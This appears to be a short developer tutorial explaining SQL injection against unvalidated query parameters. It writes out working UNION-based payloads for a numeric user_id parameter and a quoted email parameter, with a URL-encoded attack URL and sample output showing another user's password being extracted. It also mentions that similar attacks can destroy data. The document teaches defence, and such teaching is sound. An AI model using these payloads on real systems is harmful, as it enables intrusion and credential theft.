SQL Injection Attacks
=====================

SQL injection attacks take advantage of code that does not validate user input or properly escape (or quote) strings used in SQL queries.

Attack on column_id=$column_id
------------------------------

Lets say we have a page `mypage.html?user_id=1` which displays the greeting "Jimmy's Page"
The variable `user_id` is set to 1 and the page uses the insecure query `select name from users where user_id=$user_id`
If no validation takes place on the input for `$user_id` a SQL injection attach can be crafted to extract arbitary information from the database.

For example:

```
% set user_id "1 UNION ALL select password as name from users where user_id=2 order by name DESC LIMIT 1"
% set qry "select name from users where user_id=$user_id"
% select name from users where user_id=1 UNION ALL select password as name from users where user_id=2 order by name LIMIT 1
```

When this query runs it returns:

```
name   
----------
conner23
(1 row)
```

You might need to change the `order by` clause depending on the values in the database.

To pass this value of `user_id` to the page it needs to be url encoded.

```
% set user_id "1 UNION ALL select password as name from users where user_id=2 order by name DESC LIMIT 1"
% url mypage.html user_id
mypage.html?user%5fid=1+UNION+ALL+select+password+as+name+from+users+where+user%5fid%3d2+order+by+name+DESC+LIMIT+1
So the welcome message on the page will read "conner23's Page" and the 
```

So the welcome message on the page will read "conner23's Page" and the password for user 2 is compromised.

Similar attacks can be used on `UPDATE` and `INSERT` queries to manipulate or destroy the database.

Attack on column='$column'
--------------------------

A page uses the insecure qry `select name from users where email='$email'`

```
% set email "foo@bar.com' UNION ALL select password as name from users where user_id=2 order by name;--"
% set qry "select name from users where email='$email'"
select name from users where email='foo@bar.com' UNION ALL select password as name from users where user_id=2 order by name;--'
```

***Of course we don't store real passwords in plain text, we store a hash value instead but depending on the hash and the length of the password this may be trivial to crack.***